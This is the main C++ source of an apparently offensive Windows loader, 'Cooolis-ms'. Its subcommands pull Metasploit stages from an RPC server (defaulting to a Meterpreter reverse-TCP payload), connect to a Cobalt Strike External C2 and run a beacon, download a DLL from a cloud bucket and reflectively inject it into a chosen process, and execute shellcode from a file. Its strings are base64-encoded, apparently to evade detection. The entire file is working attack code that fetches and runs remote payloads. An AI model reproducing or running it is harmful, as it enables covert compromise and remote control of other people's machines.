/**************************
Code By Rvn0xsy
https://payloads.online
Email:rvn0xsy@gmail.com

SubCommand : Cobaltstrike External C2

e.g.  Cooolis-ms-x86.exe cobaltstrike -H 1.1.1.1 -P 2222

SubCommand : Metasploit RPC

e.g.  Cooolis-ms-x86.exe metasploit -H 1.1.1.1 -P 2222

SubCommand : Reflective DLL injection

e.g.  Cooolis-ms-x86.exe reflective -f reflective_dll.dll -p PID
e.g.  Cooolis-ms-x86.exe reflective -b XXX.oss-cn-XXX.aliyuncs.com -u /reflective86.dll

***************************/



#include "Cooolis-msf.h"
#include "Cooolis-ExternalC2.h"
#include "Cooolis-Reflective.h"
#include "Cooolis-Http.h"
#include "Cooolis-Shellcode.h"
#include "Cooolis-String.h"
#include "rang.hpp"
#include "CLI11.hpp"
#include <codecvt> 


int main(int argc, char** argv)
{
	USHORT server_port = 8899;
	std::string msf_payload = "";
	std::string msf_options = "";
	std::string server_host = "";
	std::string reflective_oss_bucket = "";
	std::string reflective_file = "";
	std::string reflective_uri_file = "";
	std::string shellcode_file = "";
	DWORD dwReflectiveProcessId = NULL;
	CLI::App app{ "Version v1.2.6" };

	app.require_subcommand(1);


	// [Metasploit]
	auto metasploit = app.add_subcommand(CooolisString("bWV0YXNwbG9pdA=="), CooolisString("TWV0YXNwbG9pdCBSUEMgTG9hZGVy"));
	

	metasploit->add_option(CooolisString("LXAsLS1wYXlsb2Fk"), msf_payload, CooolisString("UGF5bG9hZCBOYW1lLCBlLmcuIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3A="))->default_str(CooolisString("d2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX3RjcA=="));
	metasploit->add_option(CooolisString("LW8sLS1vcHRpb25z"), msf_options, CooolisString("UGF5bG9hZCBvcHRpb25zLCBlLmcuIExIT1NUPTEuMS4xLjEsTFBPUlQ9ODg2Ng=="));
	

	metasploit->add_option(CooolisString("LVAsLS1QT1JU"), server_port, CooolisString("UlBDIFNlcnZlciBQb3J0"))->check(CLI::Range(1, 65535))->default_val(8899)->required();
	metasploit->add_option(CooolisString("LUgsLS1IT1NU"), server_host, CooolisString("UlBDIFNlcnZlciBIb3N0"))->check(CLI::ValidIPV4)->required();

	metasploit->callback([&]() {
		if (msf_options.length() > 200 || msf_payload.length() > 200) {
			std::cout << rang::bg::red << rang::style::bold << rang::fg::cyan << (std::string)CooolisString("UFR5cGUgQW5kIFBPcHRpb25zIFRvbyBsb25nIQ==") << std::endl;
		}
		else {
			CCooolisMetasploit* CooolisMSF = new CCooolisMetasploit;

			if (CooolisMSF->ConnectServer(server_host, server_port)) {
				CooolisMSF->SendPayload(msf_options, msf_payload);
				CooolisMSF->RecvStage();
				CooolisMSF->GoodCooolis();
			}

			delete CooolisMSF;
		}
	});

	// [Cobaltstrike]
	auto cobaltstrike = app.add_subcommand(CooolisString("Y29iYWx0c3RyaWtl"), CooolisString("Q29iYWx0IFN0cmlrZSBFeHRlcm5hbCBDMiBMb2FkZXI="));
	cobaltstrike->add_option(CooolisString("LVAsLS1QT1JU"), server_port, CooolisString("RXh0ZXJuYWwgQzIgUG9ydA=="))->check(CLI::Range(1, 65535))->required();
	cobaltstrike->add_option(CooolisString("LUgsLS1IT1NU"), server_host, CooolisString("RXh0ZXJuYWwgQzIgSG9zdA=="))->check(CLI::ValidIPV4)->required();

	cobaltstrike->callback([&]() {
		CCooolisExternalC2* CooolisCobaltstrike = new CCooolisExternalC2;
		if (CooolisCobaltstrike->ConnectServer(server_host, server_port) != FALSE) {
			CooolisCobaltstrike->SendOptions();
			CooolisCobaltstrike->RecvPayload();
			CooolisCobaltstrike->HandleBeacon();
		}
	});

	// [Reflective]
	auto reflective = app.add_subcommand(CooolisString("cmVmbGVjdGl2ZQ=="), CooolisString("UmVmbGVjdGl2ZSBETEwgaW5qZWN0aW9u"));
	reflective->add_option(CooolisString("LWYsLS1maWxl"), reflective_file, CooolisString("UmVmbGVjdGl2ZSBETEwgUGF0aA=="))->check(CLI::ExistingFile);
	reflective->add_option(CooolisString("LXUsLS11cmk="), reflective_uri_file, CooolisString("UmVmbGVjdGl2ZSBETEwgVVJJ"));
	reflective->add_option(CooolisString("LWIsLS1idWNrZXQ="), reflective_oss_bucket, CooolisString("UmVmbGVjdGl2ZSBETEwgT1NTIEJ1Y2tldA=="));
	reflective->add_option(CooolisString("LXAsLS1waWQ="), dwReflectiveProcessId, CooolisString("UmVmbGVjdGl2ZSBJbmplY3QgUHJvY2VzcyBJZA=="))->default_val(GetCurrentProcessId());

	reflective->callback([&]() {
		CCooolisReflective* CooolisReflective = new CCooolisReflective;
		// 优先尝试本地加载
		if (reflective_file.empty() == FALSE) {
			CooolisReflective->ReflectiveInject(dwReflectiveProcessId, reflective_file);
		}else {
			// 如果oss bucket和URI为空，则抛出错误提示
			if (reflective_oss_bucket.empty() || reflective_uri_file.empty()) {
				std::cout << (std::string)CooolisString("WypdIFRoZSBCdWNrZXQgb3IgUmVmbGVjdGl2ZSBETEwgVVJJIGlzIEVtcHR5Lg==") << std::endl;
				std::cout << app.help() << std::endl;
				return FALSE;
			}
			// 正常执行....

			CCooolisHttp* CooolisHttp = new CCooolisHttp;

			LPVOID lpBuffer = NULL; // DLL 内存地址
			DWORD dwBufferSize = 0; // DLL 大小


			std::wstring reflective_oss_bucket_ws, reflective_uri_file_ws;
			std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
			reflective_oss_bucket_ws = converter.from_bytes(reflective_oss_bucket);
			reflective_uri_file_ws = converter.from_bytes(reflective_uri_file);

			// 连接OSS
			if (!CooolisHttp->ConnectServer(reflective_oss_bucket_ws.data(), 443)) {
				std::cout << (std::string)CooolisString("WypdIENhbid0IENvbm5lY3QgQWxpeXVuIEJ1Y2tldC4=") << std::endl;
				std::cout << app.help() << std::endl;
				return FALSE;
			}

			lpBuffer = CooolisHttp->ReadHttpFile(reflective_uri_file_ws.data(), dwBufferSize); // 读取文件
			
			CooolisReflective->ReflectiveInject(dwReflectiveProcessId, lpBuffer, dwBufferSize); // 注入DLL

			// 释放内存
			HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpBuffer);
			delete CooolisHttp;
		}
		delete CooolisReflective;
		return TRUE;
	});

	
	// [Shellcode]
	auto shellcode = app.add_subcommand(CooolisString("c2hlbGxjb2Rl"), CooolisString("U2hlbGxjb2RlIExvYWRlcg=="));
	shellcode->add_option(CooolisString("LWYsLS1maWxl"), shellcode_file, CooolisString("U2hlbGxjb2RlIFBhdGg="))->check(CLI::ExistingFile);

	shellcode->callback([&]() {
		DWORD dwFileSize = 0;
		CCooolisShellcode* CooolisShellcode = new CCooolisShellcode;

		dwFileSize = CooolisShellcode->LoadeShellcodeFile(shellcode_file);
		if (dwFileSize == 0) {
			return FALSE;
		}
		CooolisShellcode->ConvertShellcodeByCHAR(dwFileSize);
		CooolisShellcode->CreateThreadRun(); // 从油槽读取
		delete CooolisShellcode;
		return TRUE;
	});

	
	try {
		CLI11_PARSE(app, argc, argv);
	}
	catch (const CLI::ParseError& e) {
		std::cout << app.help() << std::endl;
		return app.exit(e);
	}

	return GetLastError();

	
}

